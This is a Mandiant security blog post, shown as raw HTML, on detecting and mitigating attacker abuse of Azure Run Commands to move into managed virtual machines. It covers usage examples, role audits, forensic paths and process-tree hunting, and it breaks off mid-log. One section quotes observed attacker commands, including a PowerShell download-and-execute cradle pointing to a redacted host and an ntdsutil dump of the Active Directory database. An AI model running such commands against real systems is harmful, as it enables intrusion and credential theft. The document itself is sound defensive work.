class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-qWD73c"><h5 class="cHE8Ub Qwf2Db-MnozTc Qwf2Db-MnozTc-OWXEXe-MnozTc-qWD73c">Mandiant </h5><p class="nRhiJb-qJTHM khCp7b"></p></div></section></div></section><div class="nRhiJb-DARUcf"><div class="nRhiJb-ObfsIf nRhiJb-DbgRPb-wNfPc-ma6Yeb nRhiJb-DbgRPb-qWD73c-cGMI2b"><div class="nRhiJb-kR0ZEf-OWXEXe-GV1x9e-ibL1re dzoHJ"></div><div class="OYL9D nRhiJb-kR0ZEf-OWXEXe-GV1x9e-OiUrBf" jsname="tx2NYc"><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Written by: Adrien Bataille, Anders Vejlby, Jared Scott Wilson, Nader Zaveri</p>
<hr></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">In Mandiant’s recent blog post, we detailed </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/russian-targeting-gov-business" rel="noopener" target="_blank"><span lang="EN-IE">suspected Russian intrusion activity</span></a><span lang="EN-IE"> that targeted managed services providers (MSP) to gain access to their customers’ cloud environments. Other companies, such as Microsoft, have observed </span><a href="https://blogs.microsoft.com/on-the-issues/2021/10/24/new-activity-from-russian-actor-nobelium/" rel="noopener" target="_blank"><span lang="EN-IE">similarly targeted activity</span></a><span lang="EN-IE"> against customers of several </span><a href="https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/" rel="noopener" target="_blank"><span lang="EN-IE">cloud and managed service providers</span></a><span lang="EN-IE">.<sup> </sup>One notable technique from these intrusions is the use of Azure Run Commands to move laterally from managed hypervisors to the MSP customers’ underlying virtual machines.</span></p>
<p><span lang="EN-IE">This latest blog post comes as a supplementary annex to highlight Azure Run Commands and provide guidance for mitigations, hunting, and detection mainly from the perspective of the virtual machines at risk from this type of activity. As other blog posts have focused on Azure logs and permissions and what can be learned from these sources, here we will focus more on what can be learned from the evidence sources inside the virtual machines themselves.</span></p>
<p><span lang="EN-IE">This method of pivoting from Azure to the underlying virtual machines (VMs) is significant for a couple of reasons:</span></p>
<ul>
<li><span lang="EN-IE">An Azure account compromise could result in granting full access to underlying Virtual Machines, even when those systems are segmented on the virtual layer.</span></li>
<li><span lang="EN-IE">Running commands through Azure means there is an easy route for elevated privilege execution, without worrying about connectivity and authorization at the virtual layer.</span></li>
</ul>
<p><span lang="EN-IE">In most cases, the final goal of the attacker is related to the virtual level and not the hypervisor. For example, an attacker is likely interested in stealing information residing inside the virtual systems or encrypting the data and individual systems themselves. While a hypervisor level compromise may allow attackers to circumvent many host-level detection and response mechanisms, there are still opportunities to identify attackers as they pursue their mission objectives.</span></p>
<h2>Azure Run Commands</h2>
<p><span lang="EN-IE">The Azure Run Command feature enables administrators to run commands on Azure Windows or Linux virtual machines by leveraging the virtual machine agent. The agent is installed by default on Windows and Linux virtual machines deployed from an Azure Marketplace image but can be disabled.</span></p>
<p><span lang="EN-IE">Azure Run Commands are well documented on the Microsoft website at the following locations:</span></p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command" rel="noopener" target="_blank">Run scripts in your Windows VM by using action Run Commands</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command" rel="noopener" target="_blank">Run scripts in your Linux VM by using action Run Commands</a></li>
</ul>
<p><span lang="EN-IE">Azure administrators can run them using the Azure Portal user interface, the API, PowerShell, or the Azure command line interface; each of which will be demonstrated as follows. Each operating system has distinct command types that support arbitrary script execution on virtual machines.</span></p>
<ul>
<li><span lang="EN-IE">On Windows, the </span><em><span lang="EN-IE">RunPowerShellScript</span></em><span lang="EN-IE"> command executes PowerShell on the virtual machine as the SYSTEM user.</span></li>
<li><span lang="EN-IE">On Linux, the </span><em><span lang="EN-IE">RunShellScript</span></em><span lang="EN-IE"> command executes a shell script on the virtual machine as the root user.</span></li>
</ul>
<p><span lang="EN-IE">These command types must be supplied via the “command-id” parameter when using the Run Command feature.</span></p>
<h3>Via Azure Portal</h3>
<p><span lang="EN-IE">Figure 1 shows two commands ‘w’ and ‘whoami’ sent to our Linux virtual machine using the Azure Portal web console.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1300x1300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1300x1300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1300x1300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure1_xlfk.max-1300x1300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 1: Azure run commands towards a Linux host</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><h3>Via Azure CLI</h3>
<p><span lang="EN-IE">Administrators can execute a PowerShell script by name using the following Azure CLI command.</span></p>
<p> </p>
<pre><code>az vm run-command invoke --command-id RunPowerShellScript --name winvm -g 
resourcegroup --scripts @myscript.ps1 --parameters "arg1=firstarg"

</code></pre>
<p><span lang="EN-IE">Azure CLI also accepts individual commands, such as in the following example using the Linux VM “RunShellScript” module.</span></p>
<p> </p>
<pre><code>az vm run-command invoke -g resourcegroup -n linuxvm --command-id RunShellScript --
scripts "uname -a"

</code></pre>
<h3>Via the REST API</h3>
<p><span lang="EN-IE">The Azure REST API’s runCommand endpoint accepts HTTP POST requests such as the following, with </span><span lang="EN-IE">required parameters</span><span lang="EN-IE">, defined in the POST request body.</span></p>
<p> </p>
<pre><code>https://management.azure.com/subscriptions/{subscriptionId}/re
sourceGroups/{resourceGroupName}/providers/Microsoft.Compute/v
irtualMachines/{vmName}/runCommand?api-version=2021-07-01</code></pre>
<h3>Via PowerShell Cmdlet</h3>
<p><span lang="EN-IE">The Azure PowerShell cmdlet also includes a command for Azure Run Commands. Note that the proper Azure Context needs to be provided either by running the </span><em><span lang="EN-IE">Connect-AzAccount</span></em><span lang="EN-IE"> command or using the -Context parameter.</span></p>
<p> </p>
<pre><code>Invoke-AzVMRunCommand -ResourceGroupName 'resourcegroup' -Name 'winvm' -CommandId 
'RunPowerShellScript' -ScriptPath 'myscript.ps1'</code></pre>
<p><em><span lang="EN-IE">Invoke-AzVMRunCommand</span></em><span lang="EN-IE"> returns a PSRunCommandResult object with the script results in the “Message” field. In Figure 2, the results contain “nt authority\system”, because the script executed a single whoami command.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure2_trlt.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 2: Azure run commands via PowerShell</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><h2>Mitigations</h2>
<h3>Limiting Run Command Access</h3>
<p><span lang="EN-IE">As </span><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command" rel="noopener" target="_blank"><span lang="EN-IE">documented by Microsoft</span></a><span lang="EN-IE">, executing Run Commands requires the </span><em><span lang="EN-IE">Microsoft.Compute/virtualMachines/runCommand/ </span></em><span lang="EN-IE">permission. The Virtual Machine Contributor role and higher levels have this permission. The Virtual Machine Contributor role has the ability to manage the virtual machines but are not allowed to access the virtual machine, storage account, and virtual network it resides in. Performing regular Azure permissions audits or limiting the number of users with this permission would reduce the attack surface of accounts that can execute Run Commands.</span></p>
<p><span lang="EN-IE">An organization can perform an audit of the Virtual Machine Contributor role or other high-level roles with the following PowerShell command.</span></p>
<p> </p>
<pre><code>Get-AzureRmRoleAssignment | ? {$_.RoleDefinitionName -eq 'Virtual Machine 
Contributor'} | ft RoleDefinitionName, UserPrincipalName, DisplayName</code></pre>
<p><span lang="EN-IE">Since we are mainly concerned with the permission that allow for Azure RunCommand usage, the following script queries all built-in and custom roles created within Azure that contain the specific RunCommand permission.</span></p>
<p> </p>
<pre><code>import sys
from azure.identity import DefaultAzureCredential
from azure.mgmt.authorization import AuthorizationManagementClient 

if len(sys.argv) &lt; 2:
    print(&quot;You need to supply the permission to search for&quot;)
    sys.exit(1)
 
credential = DefaultAzureCredential()
client = AuthorizationManagementClient(
    credential=credential,
    subscription_id=&quot;YOUR_SUBSCRIPTION_ID&quot;
)
 
desired_action = sys.argv[1]
desired_action_lower = desired_action.lower()
desired_action_wildcard = &quot;/&quot;.join(desired_action_lower.split(&quot;/&quot;)[:-1] + [&quot;*&quot;])
 
role_definitions = list(client.role_definitions.list(scope=&quot;&quot;))
for role_def in client.role_definitions.list(scope=&quot;&quot;):
    for permission in role_def.permissions:
        for action in permission.actions:
            if action.lower() == desired_action_lower or action.lower() == desired_action_wildcard:
                print(f&quot;Role &#39;{role_def.role_name}&#39; contains {action}&quot;)</code></pre>
<p><span lang="EN-IE">After an organization has identified all roles that have the ability to execute Run Commands on Virtual Machines, then it can use the previous PowerShell script to obtain the individual users or groups that have said permission. Mandiant recommends having regular entitlement reviews of this and other high-risk permissions with Azure.</span></p>
<h3>Create a Custom Just-in-Time (JIT) Administrative Role for Run Command Permissions</h3>
<p><span lang="EN-IE">Another method to mitigate the risk and reducing the attack surface of this potential attack is by creating a Just-in-Time (JIT) administrative role that contains the Run Command permissions needed to perform legitimate run command-like actions on a virtual machine. By creating this custom role, we remove the need for a user to have persistent Run Command capabilities on Virtual Machines.</span></p>
<p><span lang="EN-IE">The following sample PowerShell script creates a custom JIT Run Command role for a prescribed subscription and resource group (Note: Replace the subscriptionid and resourcegroupname with the desired organization’s subscription and resource group).</span></p>
<p> </p>
<pre><code>$role = Get-AzRoleDefinition "Virtual Machine Contributor"
$role.Id = $null
$role.Name = "Run Command JIT Permissions"
$role.Description = "Can request JIT for Run Command actions on virtual machines."
$role.Actions.Clear()
$role.Actions.Add("Microsoft.Compute/virtualMachines/runCommand/*")
$role.AssignableScopes.Clear()
$role.AssignableScopes.Add("/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/")
New-AzRoleDefinition -Role $role
 
$scope="/subscriptions/{subscriptionid}/resourceGroups/{resourcegroupname}/"
New-AzRoleAssignment -ObjectId {AD Group Object Id}  -RoleDefinitionName "JIT Virtual Machine Run Command Role" -Scope $scope</code></pre>
<p><span lang="EN-IE">After the custom JIT role has been made, Mandiant recommends assigning the JIT Role to a newly created Azure AD Group, and then managing the access to the newly created group using Azure Privileged Identity Management (PIM).</span></p>
<h3>Removing the VM agent</h3>
<p><span lang="EN-IE">The most basic task that can be performed to mitigate this functionality is to remove the agent from the underlying VM, however, this may have serious consequences to how the virtual machine is administrated.</span></p>
<p><span lang="EN-IE">Also, it is important to note that by doing so, you are not removing the attacker’s access to the hypervisor level, and they may have other means to steal your data or compromise hosts.</span></p>
<p><span lang="EN-IE">By removing the agent, you are also removing the main means that you can leverage for detecting this feature being used on your virtual machines. For example, if an attacker runs a command from the Azure CLI, you can detect this with proper detections in place. But if the attacker creates a snapshot of your system, this will be undetected. Therefore, it is critical to perform risk analysis to determine how to best proceed. Removing the agent entirely would eliminate a potential vector for the adversary to abuse but would also push the attacker away from your line of sight.</span></p>
<p><span lang="EN-IE">The references at the following locations provide commands to remove the Windows and Linux agents:</span></p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/troubleshoot/azure/virtual-machines/windows-azure-guest-agent" rel="noopener" target="_blank">Troubleshooting Windows Azure Guest Agent</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disable-provisioning" rel="noopener" target="_blank"><span lang="EN-IE">Disable or remove the Linux Agent from VMs and images</span></a></li>
</ul>
<h2>Malicious Run Command Usage in the Wild</h2>
<p><span lang="EN-IE">Mandiant has directly observed commands such as the following while conducting incident response investigations. These commands were executed in several different scripts and showcase an almost full chain of activity from reconnaissance to malicious code execution and credential harvesting.</span></p>
<p> </p>
<pre><code>#Reconnaissance
Get-Process
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
(Get-Aduser -Filter *).Count
(Get-Aduser -Filter *)[500]
Get-MpComputerStatus
Get-AdDomainController -Discover
cmd /c whoami; ls C:\
ls &quot;C:\Program Files&quot;
Get-Process | Select -First 25
 
#Code Execution
C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -C &quot;iex((New-Object system.net.webclient).downloadstring(&lt;redacted&gt;))&quot;
Write-Host (New-Object System.Net.WebClient).DownloadString(&quot;http://&lt;redacted&gt;.com&quot;)
 
#Credential Harvesting
ntdsutil.exe &#39;ac i ntds&#39; &#39;ifm&#39; &#39;create full C:\Temp\t&#39; q q</code></pre>
<p><span lang="EN-IE">As we can see from the aforementioned examples, while Run Command usage may be relatively novel, the commands being executed represent known attacker techniques and methodologies. This means traditional detection logic for suspicious commands will still be valid, but these mechanisms can be augmented with the context that they were executed using the Run Command feature.</span></p>
<h2>Detection and Hunting</h2>
<h3>Forensic Artifacts and File Paths</h3>
<p><span lang="EN-IE">Detection and Hunting on the affected virtual machines should use a combination of forensic artifacts and logs and differ between Windows and Linux virtual machines.</span></p>
<h4>Windows Virtual Machines</h4>
<p><span lang="EN-IE">On Windows, the use of the RunPowerShellScript functionality will create related PowerShell logs depending on your logging policy. As such, any typical rules written for malicious activity leveraging these logs or process will provide alerts as normal. For additional resources on generic PowerShell logging, see the Mandiant post, “</span><a href="https://cloud.google.com/blog/topics/threat-intelligence/greater-visibility" rel="noopener" target="_blank"><span lang="EN-IE">Greater Visibility Through PowerShell Logging</span></a><span lang="EN-IE">”.</span></p>
<p><span lang="EN-IE">However, in our testing of a default Azure setup, the Azure Activity Log showed that Run Command functionality was used but did not log the contents of the actual script being pushed to the virtual machine for execution. This means that by default logs will show that a Run Command action was performed but not the commands executed within the script.</span></p>
<p>On Windows virtual machines, the PowerShell scripts are downloaded to the following directory, where the &lt;version number&gt; varies and the &lt;job number&gt; is incremented starting at 0:</p>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<pre><code>C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\&lt;version number&gt;\Downloads\script&lt;job number&gt;.ps1.</code></pre>
</div>
</div>
</div>
</div>

<p> </p>
<pre><code>C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\&lt;version number&gt;\Status
\&lt;job number&gt;.status.</code></pre></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure4_vyfq.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure4_vyfq.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure4_vyfq.max-1200x1200.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure4_vyfq.max-1200x1200.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 4: Directory listing showing output files from run-commands</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">Figure 5 shows the contents of a status file for a successful script execution with the various script outputs logged in JSON format. These have valuable additional forensic information such as the execution timestamp.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure5.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure5.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure5.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure5.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 5: Contents of a standard log file showing the output and metadata of a "whoami" command</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><h4>Linux Virtual Machines</h4>
<p><span lang="EN-IE">On Linux, Azure Run Command creates a directory per job in: /var/lib/waagent/run-command/download/. Each job directory contains three files: script.sh, stderr, and stdout.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure6_wlpw.max-1000x1000.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 6: Contents of the /var/lib/waagent/run-command/download directory</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">The file script.sh contains the command executed on the host; stderr contains the standard error; and stdout contains the result.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure7.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 7: Contents of script.sh and stdout files</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">These output files have less metadata than their Windows counterpart, but additional details are recorded in the following location: /var/log/azure/run-command/handler.log. This log includes basic metadata such as the date/time of run command executions, but it does not include the script contents or results.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure8.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure8.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure8.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure8.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 8: Sample contents of /var/log/azure/run-command/handler.log</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">Commands that failed will also be logged in this file, such as the excerpt shown in Figure 9.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure9.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure9.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure9.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure9.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 9: Sample contents of /var/log/azure/run-command/handler.log</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><h3><span lang="EN-IE">Identifying Process Anomalies</span></h3>
<h4>Windows Virtual Machines</h4>
<p><span lang="EN-IE">RunPowerShellScript activity creates a very distinct process tree under the WindowsAzureGuestAgent.exe process. Figure 10 shows the processes created after execution of </span><em><span lang="EN-IE">whoami</span></em><span lang="EN-IE"> using RunPowerShellScript.</span></p></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/azure10.max-800x800.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p>Figure 10: Process tree under WindowsAzureGuestAgent.exe as an execution of "whoami" is performed</p></div></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><div jsaction="rcuQ6b:npT2md" jscontroller="M0Q3Qb" class=" "><p><span lang="EN-IE">With the parent/child relationship detection, engineers can create rules to detect commands, which may not be suspicious on their own, but would rarely be run through the aforementioned process tree. For example, </span><em><span lang="EN-IE">whoami.exe</span></em><span lang="EN-IE"> may be common and benign in most cases, but suspicious if launched as a child of </span><em><span lang="EN-IE">powershell -ExecutionPolicy Unrestricted -File script.ps1,</span></em><span lang="EN-IE"> which would indicate potential reconnaissance. Commands with commonly malicious usage, such as </span><em><span lang="EN-IE">ntdsutil.exe, </span></em><span lang="EN-IE">should be of high concern if seen as a child process of WindowsAzureGuestAgent.exe.</span></p>
<p><span lang="EN-IE">If any usage of RunPowerShellScript is suspicious in your organization, you can monitor any sub-processes of WindowsAzureGuestAgent and whitelist commands as needed for legitimate management activity.</span></p>
<p><span lang="EN-IE">In addition to process anomalies, you can monitor file creation/modification events in the directories used by Azure Run Commands. If your monitoring solution logs the full file content for these events, it will show the actual commands being executed which can also be reviewed for malicious commands or anomalous usage.</span></p>
<h4>Linux Virtual Machines</h4>
<p><span lang="EN-IE">On Linux, Azure run commands can be detected by looking for command lines such as the following:</span></p>
<p> </p>
<pre><code>nohup /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.2/bin/run-command-extension enable</code></pre>
<p><span lang="EN-IE">Furthermore, parent-child relationships can be used to hunt for suspicious processes that have a parent process command line following this syntax:</span></p>
<p> </p>
<pre><code>/bin/sh -c /var/lib/waagent/run-command/download/3/script.sh</code></pre>
<p><span lang="EN-IE">Similar to Windows, file monitoring solutions can be used to trigger alerts on file creations in the /var/lib/waagent/run-command/download directory, and match suspicious content if this is feasible.</span></p>
<h3>Azure-Level Detection and Hunting</h3>
<p><span lang="EN-IE">In the Azure Portal, the Activity Logs for each VM will capture Azure Run Command executions. Azure Activity Logs can be found in numerous locations, depending on the environment, including but not limited to an Azure Sentinel instance, Microsoft Defender Advanced Hunting, a Log Analytics Workspace, or on the VM Azure Portal page itself.</span></p>
<p><span lang="EN-IE">The following is an example alert for a Run Command action. This log shows that the “runCommand” for the virtual machine named testvm (1) was actioned and successfully executed via the user@contoso[.]com (2) account from IP address 127.0.0[.]1 (3).</span></p>
<p> </p>
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<div style="color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%">
<pre><code>{
    "authorization": {
